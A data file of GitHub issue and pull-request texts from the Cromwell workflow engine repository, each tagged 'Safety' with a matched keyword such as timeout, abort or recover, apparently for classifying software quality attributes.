Safety,"Things Changed; - added a cromwell-master, which refreshes status metadata. There can be only one.; - created a pool of cromwell_norefresh, which has status refresh turned off, these can scale; - found race condition when multiple cromwells try to create the liquibase lock table at once, configured to have master go first; - updated scripts/compose to handle the above two kinds of cromwell; - increased to 100 batches of 10 workflow each; - changed timeout script to show number of completed workflows and break when done; - delete database at start of run, so the above works; - ran heartbeats in auto-commit mode rather than in a single transaction; - dump out logs at end of run for debugging. Things I'd like to share; - Lock Ordering in SELECT...FOR UPDATE no es bueno, there are great feature in MYSQL v8 (SKIP LOCKED) but we can't use those yet; - how to configure mysql for query logging, and what it shows; - heartbeat batches were never a batched update, just a big transaction; - slick terminology can give give the wrong intuition; - impact of cleaning db before each run; - No deadlocks!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4508:452,timeout,timeout,452,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4508,1,['timeout'],['timeout']
Safety,"This PR adds `WORKFLOW_NAME`, `TASK_INPUTS`, `TASK_DISKS`, and `MONITORING_CONFIG` environment variables for `MonitoringAction` in PAPIv2 backend. These variables are used to pass details about task inputs and disk mappings (both in JSON form), along with an image-specific config string (e.g. `project-id.dataset-id.table-id` for `quay.io/broadinstitute/cromwell-monitor-bigquery`), into the container specified through the existing `monitoring_image` option. It also adds `bigquery.insertdata` OAuth scope, to be used for streaming monitoring data into BigQuery (@adrazhi seems to approve scope extension).; ; This PR will enable us to:; - stream monitoring data at scale into BQ (much more so than was possible through Stackdriver),; - build detailed models for prediction of runtime resource utilization, using BQ or external tools (e.g. Looker); - easily detect runtime failure modes such as running OOM. (Please see https://github.com/broadinstitute/cromwell-task-monitor-bbq for more info on BQ use case). However, the proposed changes are not specific to BQ (apart from the scope), and could be used for other `monitoring_image` implementations in the future, thanks to the new `monitoring_config` option for PAPIv2 backend. **Please note**: this is an initial implementation that's **not yet ready for a merge**. For example, `TASK_INPUTS` are not serialized correctly yet. We intend to add more commits to implement it fully. However, we're soliciting early feedback and review. Interested parties: @kshakir, @benjamincarlin, @rexwangcc, @mohawkTrail, @ruchim, @abaumann",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5028:765,predict,prediction,765,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5028,2,"['detect', 'predict']","['detect', 'prediction']"
Safety,"This PR is a continuation of PR https://github.com/broadinstitute/cromwell/pull/4938. The idea is to propagate line numbers to the WOM structures, so you could report an error to the user with correct source locations. . In dxWDL, I need this also to recover the original ordering of the source code. The WOM structure is a partially sorted graph. For example, in a program like: . ```wdl; workflow foo {; call A; call B; }; ```. you don't know what came first, `A` or `B`, because they are unordered.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4977#issuecomment-493627722:251,recover,recover,251,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4977#issuecomment-493627722,1,['recover'],['recover']
Safety,"This PR merges into @Horneth's branch. Good news: The tests-formerly-known-as-root are now running under `server`!; Bad news:; ```; *** 3 TESTS FAILED ***; SimpleWorkflowActorSpec:; A WorkflowActor should ; - start, run, succeed and die *** FAILED *** (10 seconds, 174 milliseconds); java.lang.AssertionError: timeout (10 seconds) waiting for 1 messages on InfoFilter(None,Right(Starting calls: wf_hello.hello:NA:1$),false); at akka.testkit.EventFilter.intercept(TestEventListener.scala:114); at cromwell.CromwellTestKitSpec$.waitForInfo(CromwellTestKitSpec.scala:129); at cromwell.SimpleWorkflowActorSpec.$anonfun$startingCallsFilter$1(SimpleWorkflowActorSpec.scala:186); ...; SimpleWorkflowActorSpec:; A WorkflowActor should ; - fail when a call fails *** FAILED *** (10 seconds, 35 milliseconds); java.lang.AssertionError: timeout (10 seconds) waiting for 1 messages on InfoFilter(None,Right(Starting calls: wf_goodbye.goodbye:NA:1$),false); at akka.testkit.EventFilter.intercept(TestEventListener.scala:114); at cromwell.CromwellTestKitSpec$.waitForInfo(CromwellTestKitSpec.scala:129); at cromwell.SimpleWorkflowActorSpec.$anonfun$startingCallsFilter$1(SimpleWorkflowActorSpec.scala:186); ...; WorkflowExecutionActorSpec:; WorkflowExecutionActor ; - should allow a backend to tell it to retry... up to a point *** FAILED *** (10 seconds, 170 milliseconds); java.lang.AssertionError: timeout (10 seconds) waiting for 3 messages on InfoFilter(None,Right(Starting calls: wf_hello.hello),false); at akka.testkit.EventFilter.intercept(TestEventListener.scala:114); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActorSpec.$anonfun$new$1(WorkflowExecutionActorSpec.scala:84); ```. Still, as this isn't merging into develop feel free to press merge if you'd like.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3375#issuecomment-371344580:310,timeout,timeout,310,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3375#issuecomment-371344580,3,['timeout'],['timeout']
Safety,"This PR:; - embiggens PK of `CALL_CACHING_ENTRY` table updates it's associated FK constraints; - embiggens PK of `CALL_CACHING_AGGREGATION_ENTRY` table; - embiggens PK of `CALL_CACHING_DETRITUS_ENTRY` table; - embiggens PK of `CALL_CACHING_SIMPLETON_ENTRY` table. And sets the auto-increment counter of above tables and `CALL_CACHING_HASH_ENTRY` table to 20,000,000,000. See more details for this change in [this document](https://docs.google.com/document/d/1AyWVVf2pHA6BukYo3yPG2f3CZ8dTWk7F-c9KZC9WMjg/edit#heading=h.a69ivurg93m6). Reference - https://github.com/broadinstitute/cromwell/pull/5379. Remediation for https://broadworkbench.atlassian.net/browse/PROD-707",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6815:599,Remediat,Remediation,599,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6815,1,['Remediat'],['Remediation']
Safety,"This adds a mechanism of gzipping the list of output files in the AWS backend to avoid the container override size limit. This mechanism was already in place for the inputs, this will simply utilize it for the outputs as well. I haven't tested this yet (hence the draft) and from what I have seen it isn't being tested by centaur either, so I'll still need to have a look at that.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5441:81,avoid,avoid,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5441,1,['avoid'],['avoid']
Safety,"This allows the `ORDER BY` to use the index and is also more consistent because varying workflow lengths could cause sorting by ID to actually be incorrect with respect to end time. 190 ms, uses `IX_WORKFLOW_METADATA_SUMMARY_ENTRY_MAS_ET`:; ```; select ; SQL_NO_CACHE `WORKFLOW_EXECUTION_UUID`, ; `WORKFLOW_NAME`, ; `WORKFLOW_STATUS`, ; `START_TIMESTAMP`, ; `END_TIMESTAMP`, ; `SUBMISSION_TIMESTAMP`, ; `PARENT_WORKFLOW_EXECUTION_UUID`, ; `ROOT_WORKFLOW_EXECUTION_UUID`, ; `METADATA_ARCHIVE_STATUS`, ; `WORKFLOW_METADATA_SUMMARY_ENTRY_ID` ; from ; `WORKFLOW_METADATA_SUMMARY_ENTRY` ; where ; (; (; `WORKFLOW_STATUS` in ('Succeeded', 'Aborted', 'Failed'); ) ; and (; `METADATA_ARCHIVE_STATUS` is null; ); ) ; and (; `END_TIMESTAMP` <= '2021-05-11 21:21:21.265212'; ) ; order by ; `END_TIMESTAMP` ; limit ; 20;; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6350:634,Abort,Aborted,634,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6350,1,['Abort'],['Aborted']
Safety,"This bug was caused by ""userland"" (WDL) code throwing an exception where we did not expect it, causing issues for the ""kernel"" (Cromwell). Now we encapsulate possible exceptions in an `ErrorOr` so they can be safely evaluated in the `case Left(f) =>`. As a stylistic point, I changed `WomMap()` to `WomMap.apply()` to make it more obvious that we're really doing a lot of custom stuff and it's not just a regular old constructor. As a bonus, the new code detects all previous stuck-aborting workflows and fails them. After:; ```; INFO - WorkflowManagerActor: Workflow 1432d67e-3e95-40c8-acbd-d42f75040f1b failed (during ExecutingWorkflowState): cromwell.engine.workflow.lifecycle.execution.WdlRuntimeException: Failed to evaluate 'example2' (reason 1 of 1): Evaluating { ""second"": test, ""lowerLayer"": example1 } failed: Cannot construct WomMapType(WomStringType,WomAnyType) with mixed types in map values: [WomString(Hello World), WomObject(Map(first -> WomString(Hello World), number -> WomInteger(2)),WomCompositeType(Map(first -> WomStringType, number -> WomIntegerType),Some(firstLayer)))]; INFO - WorkflowManagerActor: Workflow actor for 1432d67e-3e95-40c8-acbd-d42f75040f1b completed with status 'Failed'. The workflow will be removed from the workflow store.; ```; ```; {; 	""status"": ""Failed"",; 	""id"": ""1432d67e-3e95-40c8-acbd-d42f75040f1b""; }; ```. Before:; ```; ERROR - Cannot construct WomMapType(WomStringType,WomAnyType) with mixed types in map values: [WomString(Hello World), WomObject(Map(first -> WomString(Hello World), number -> WomInteger(2)),WomCompositeType(Map(first -> WomStringType, number -> WomIntegerType),Some(firstLayer)))]; java.lang.UnsupportedOperationException: Cannot construct WomMapType(WomStringType,WomAnyType) with mixed types in map values: [WomString(Hello World), WomObject(Map(first -> WomString(Hello World), number -> WomInteger(2)),WomCompositeType(Map(first -> WomStringType, number -> WomIntegerType),Some(firstLayer)))]; 	at wom.values.WomMap.<init>(Wo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7385:209,safe,safely,209,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7385,3,"['abort', 'detect', 'safe']","['aborting', 'detects', 'safely']"
Safety,"This change enables blob filesystems to be opened that do not belong to the workspace, including public containers, and containers the requesting user has access to via WSM. This involves frequent 'refreshing' of the stored open filesystem in the underlying NIO implementation. To minimize the number of redundant requests to WSM, the SAS token for each open filesystem is stored and checked for expiration before attempting to reopen a previously open filesystem.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7140:304,redund,redundant,304,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7140,1,['redund'],['redundant']
Safety,"This change seems to be causing deadlocks or timeouts or ??? in some integration tests, looking into it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7128#issuecomment-1550055307:45,timeout,timeouts,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7128#issuecomment-1550055307,1,['timeout'],['timeouts']
Safety,"This doc predates that ""we should fix aborts"" google doc and is effectively a subset of that. I say effectively in that the specifics of what this ticket are asking for might be different from that doc, but that doc should be the authoritative one of the two.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1139#issuecomment-323877156:38,abort,aborts,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1139#issuecomment-323877156,1,['abort'],['aborts']
Safety,"This draft PR is one half (WIP) of migrating the E2E workflow test over to the dsp-reusable-workflows repo. There is a sibling branch on that repo as well that also needs to be developed along side this (same branch name [`WX-1307-port`], but no PR made just yet.). The PR here simply reduces the workflow so that the run-script job simply generates a token and passes all required inputs to the test script workflow housed in the other repo. If this migration moves forward, the sibling branch must either be merged first or merged at the same time as this one to avoid having to worry about branch referencing in the workflow. If migrating is optional, then you can choose to move forward or drop it if other priorities pop up (since the vanilla `WX-1307` branch can be used to cover the e2e testing from the Cromwell repo).",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7239:565,avoid,avoid,565,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7239,1,['avoid'],['avoid']
Safety,"This enables tests on a lot of Slick code that's not actually used yet in the New Worlde (nothing writes to the core engine tables since only Recover needs that and Recover hasn't been implemented). So these changes are valuable iff the New Worlde ultimately uses an engine Slick API that looks a lot like that in the Olde Worlde. My guess is that will end up being true, but at this point that's only a guess. Some things here will certainly be nixed (ExecutionEvents) or are likely to be heavily modified (anything caching-related).",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/942:142,Recover,Recover,142,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/942,2,['Recover'],['Recover']
Safety,"This fixes the docker deadlock by doing 2 things:. - makes sure that all `HttpResponse`s are either consumed or discarded to avoid https://github.com/akka/akka/issues/19538; - removes the decoupling between the `tokenFlow` and the `manifestFlow`; This is believed to be the main cause of the problem. Decoupling the token request from the manifest request can create a situation where all the connections are being used for token requests, and no connection is available to make a manifest request which makes the stream freeze.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2287:125,avoid,avoid,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2287,1,['avoid'],['avoid']
Safety,"This fixes the issue in PAPI2 and revert it to what it was before for PAPI1. Since this change was targeted at CWL and we don't plan to support CWL on PAPI1, it seems safer to revert it entirely in case it still breaks something else",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3802:167,safe,safer,167,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3802,1,['safe'],['safer']
Safety,"This happens because the EJEAs are not aborted directly. Because they're waiting for tokens the cycle looks like this:; - WEA is waiting for all EJEAs to finish; - All running BJEAs get aborted; - This releases tokens so the next group of EJEAs can begin; - They immediately get aborted; - this releases tokens so the next group of EJEAs can begin; - Ad nauseam, until all queued EJEAs start and get aborted",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1600#issuecomment-255799043:39,abort,aborted,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1600#issuecomment-255799043,4,['abort'],['aborted']
Safety,"This is a problem we have ran into as well. Our solution for now was to patch cromwell to trap SIGUSR1/2 signals to modify the rc file. These are a pre-signal fired by SGE to let the job know it's about to be killed because of requested-resource limits (https://github.com/princessmaximacenter/cromwell/commit/fe5dab7505f089f99d56b1a7eefac9eb108f5898). However, patching Cromwell every release is a bit of a bother and your solution looks a lot more promissing. Looking at the different recurring discussions on this topic I would strongly urge you to to make the timeout a recurring poll instead of a one-time-fire; I am not well versed in scala so it might be that this is already what you do =).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-424700349:564,timeout,timeout,564,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-424700349,1,['timeout'],['timeout']
Safety,This is a small batch to fix #4857 by implementing recoverAsync in AwsBatchAsyncBackendJobExecutionActor. I have tested this in our environment and it appears to work.; Implementation is based on pattern in other AsyncBackendJobExecutionActor classes,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5216:51,recover,recoverAsync,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5216,1,['recover'],['recoverAsync']
Safety,This is included in the Aborts design doc: https://docs.google.com/document/d/1B0FElJXOp4IP-v24C62CLsC0JQMbQPjaIrjOwnDqko8/edit . Closing,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1504#issuecomment-287462701:24,Abort,Aborts,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1504#issuecomment-287462701,1,['Abort'],['Aborts']
Safety,"This is the test `""assign default runtime attributes""` in `MaterializeWorkflowDescriptorActorSpec`. To avoid having to recompute the defaults separately in every backend, it should be filled in by the MWDA",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1068:103,avoid,avoid,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1068,1,['avoid'],['avoid']
Safety,"This looks like a feature request along the line to what @cjllanwarne suggested. It could be a third execution mode like ""AbortJobsOnFailure"".",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2517#issuecomment-342588430:122,Abort,AbortJobsOnFailure,122,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2517#issuecomment-342588430,1,['Abort'],['AbortJobsOnFailure']
Safety,"This makes the job-avoidance conf really optional.; Also fixed a small bug when you don't specify the path for inputs, the default one was not correct.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/284:19,avoid,avoidance,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/284,1,['avoid'],['avoidance']
Safety,"This might be the only remaining type of transient failure which hasn't been patched, but it does pop up fairly frequently. It looks like the usual pattern of retries would work here. ```; cromwell.core.CromwellFatalException: java.util.NoSuchElementException; 	at cromwell.core.CromwellFatalException$.apply(core.scala:17); 	at cromwell.core.retry.Retry$$anonfun$withRetry$2.applyOrElse(Retry.scala:38); 	at cromwell.core.retry.Retry$$anonfun$withRetry$2.applyOrElse(Retry.scala:37); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.util.NoSuchElementException; 	at java.util.ArrayList$Itr.next(ArrayList.java:854); 	at scala.collection.convert.Wrappers$JIteratorWrapper.next(Wrappers.scala:43); 	at scala.collection.IterableLike$class.head(IterableLike.scala:107); 	at s",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1966:522,recover,recoverWith,522,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1966,2,['recover'],['recoverWith']
Safety,"This passes the K.I.S.S. principle, but I personally _hate_ the ask pattern, as it leads to timeouts and exceptions when the system gets busy. One should be theoretically be able to have the two actors to `tell` / `receive` messages instead, though I don't have the code ready at this second.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/308#issuecomment-161824332:92,timeout,timeouts,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/308#issuecomment-161824332,1,['timeout'],['timeouts']
Safety,"This proposal should give us more flexibility regarding docker tags while keeping the call caching safety on false positive / negative. Docker runtime attributes with docker hashes do not need any additional processing. All logic in this ticket applies to docker runtime attributes with a ""floating"" tag, which will be referred as ""tag"" in this issue. In all cases, if Cromwell fails to retrieve the docker hash for a task, for any reason, the corresponding call(s) will NOT be eligible for call caching, neither read nor write, regardless of the call caching configuration in effect. **When to get the hashes and what to do with them:**. 1. Cromwell will lookup the hashes corresponding to docker tags, for all docker attributes in all tasks in a workflow and its subworkflows, at Materialization time.; If the runtime attribute value can't be determined, the task in question will be ineligible for call caching. The only case when that should be true is if the attribute is an expression with variables depending on previous tasks being run. 2. If the hash lookup succeed, Cromwell will use that hash to perform any call cache read / write according to the call caching configuration in effect. It will also provide that hash, along with the original floating tag, to the backend when the job gets dispatched. 3. Backends will choose wether to use the hash or the floating tag. They will report to the engine which one they used, so that the engine can send this information to the metadata. **How to get the hash:**. 1. How to get the hash depends on the backend. Which means, at this time, that only workflows for which the backend is known statically at workflow submission time will be supported. 2. If the task is expected to run on the **Local Backend**, Cromwell will attempt to find the hash corresponding to the tag on the machine where it's being run. This first attempt must be done without executing a `pull` to avoid overriding the current local image, if it exits, with the remote rep",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2048:99,safe,safety,99,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2048,1,['safe'],['safety']
Safety,"This removes several classes of confusing `ERROR` log messages that we're receiving under healthy conditions. For example, when calling `checkAccess` in the filesystem provider, which is intended to be used to detect whether a path exists, the library would log an error containing the path string. This resulted in several `ERROR` level log messages every time we created a directory structure.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6982:210,detect,detect,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6982,1,['detect'],['detect']
Safety,"This seems like a pretty recoverable error. It fails the zamboni workflow but not the cromwell workflow. So it can easily be overcome with a reconsider in zamboni. Ideally the Zamboni workflow would catch and be robust to these sorts of things, or at least log the response.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216873574:25,recover,recoverable,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216873574,1,['recover'],['recoverable']
Safety,This should also fix transient failures of the `abort a workflow mid run and restart immediately abort.restart_abort_tes` centaur test,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4197:48,abort,abort,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4197,2,['abort'],['abort']
Safety,"This small change could make it portable on any esoteric distribution / container. > also risks breaking an unknown number of cases that work fine now. Not using env is more ""risky"" in term of portability, as it would be less portable. This is due to unix requirements",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7469#issuecomment-2269916313:90,risk,risks,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7469#issuecomment-2269916313,2,['risk'],"['risks', 'risky']"
Safety,"This test appears to not deal with eventual consistency correctly and sporadically fails for what looks like bogus reasons:. ```; [info] WorkflowExecutionActorSpec:; [info] WorkflowExecutionActor; [info] - should retry a job 2 times and succeed in the third attempt *** FAILED ***; [info] cromwell.core.package$CromwellFatalException: org.scalatest.exceptions.TestFailedException: ""Running"" was not equal to ""Preempted""; [info] at cromwell.core.retry.Retry$$anonfun$withRetry$3.applyOrElse(Retry.scala:44); [info] at cromwell.core.retry.Retry$$anonfun$withRetry$3.applyOrElse(Retry.scala:43); [info] at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:344); [info] at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:343); [info] at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); [info] at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); [info] at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); [info] at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); [info] at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); [info] at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); [info] ...; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1311:636,recover,recoverWith,636,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1311,2,['recover'],['recoverWith']
Safety,"This ticket is a reminder to discuss what @cjllanwarne was saying Friday afternoon. I don't believe this is a release blocker, but noting it for future consideration:. The interplay between restart and caching is possibly not ideal. When restarting with cache read turned on, Cromwell will begin potentially expensive hash calculations on jobs that may have previously been running. However, Cromwell currently does this calculation before checking if jobs were actually running and recoverable, which if they were would make hash calculation unnecessary. . On the other hand, perhaps determining whether a job is running in the backend is more expensive than calculating hashes. Shrug. . Anyway, the current scheme is likely more accidental than intentional and would benefit from some discussion.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1441:483,recover,recoverable,483,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1441,1,['recover'],['recoverable']
Safety,"This was reported by another [FireCloud user](https://gatkforums.broadinstitute.org/firecloud/discussion/10352/removing-workflows-stuck-in-the-submitted-or-aborting-state#latest); Is there a way that we can force these jobs into Aborted so that the workspace stops appearing as ""Running""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334862844:156,abort,aborting-state,156,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334862844,2,"['Abort', 'abort']","['Aborted', 'aborting-state']"
Safety,This was requested by @patmagee - I agree that it's a good idea. Find a way to detect if a liquibase migration is pending if Cromwell starts. Add a config option (defaulting to a safe mode) such that if this option is enabled and a liquibase migration is required that the process will exit with an error message stating:. - That a migration is necessary; - Encouragement to the user to backup their database and/or do further testing if in a production environment; - Describe how to override (including via command line) the setting to allow Cromwell to start properly.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2429:79,detect,detect,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2429,2,"['detect', 'safe']","['detect', 'safe']"
Safety,"This will enable us to protect from inadvertendyl putting secrets in code:. See: https://cloudplatform.googleblog.com/2017/07/help-keep-your-Google-Cloud-service-account-keys-safe.html with this section:; ""prevent committing keys to external source code repositories""",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2479:175,safe,safe,175,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2479,1,['safe'],['safe']
Safety,"This would be extremely useful for us. We're currently having to deal with several problems that would be helped by an automated retry ability. . The first problems is what David said, we have tools that can fail sometimes due to GCS issues and being able to restart when that happens would be useful. We're working on making our code more robust to that, but it's difficult to completely fix the problem. Having to restart a workflow with 10s of thousands of jobs because 2 failed is pretty annoying. The second problem is out of memory issues. We have thousands of jobs, and most will run with a small amount of memory, but some of them will need more. It's difficult to predict ahead of time which shards will need more since it's a function of the data rather than of the file size. Having a way to automatically retry these shards with increased memory would be really valuable since it would let us provision for the average shard rather than the worst case.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1991#issuecomment-315406584:673,predict,predict,673,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1991#issuecomment-315406584,1,['predict'],['predict']
Safety,"Thoughts for a Monday Tech Talk™️:. Say we run a workflow with a 100-wide scatter and the floating Docker tags are resolved to hashes during workflow initialization. 90 of the jobs launch, but then the server goes down. The server comes up some time later and recovers the first 90 running jobs, but in the meantime the floating Docker tag has moved to a new version. We rerun the workflow initialization and calculate a different hash for the remaining 10 shards of the scatter. . It seems the hash for a Docker tag for a particular workflow should be persisted to be able to handle this case. I also wonder per @cjllanwarne if we shouldn't keep this activity in the `JobPreparationActor` to avoid knowingly creating a system that we'll have to replace when we implement dynamic dispatch. Keeping this in `JobPreparationActor` would also give us greater ability to resolve expressions for Docker tags than if we do this earlier in the workflow lifecycle.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-289168497:260,recover,recovers,260,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-289168497,2,"['avoid', 'recover']","['avoid', 'recovers']"
Safety,Thread-safe getFileSystem method in S3FileSystemProvider [BA-6156],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5328:7,safe,safe,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5328,1,['safe'],['safe']
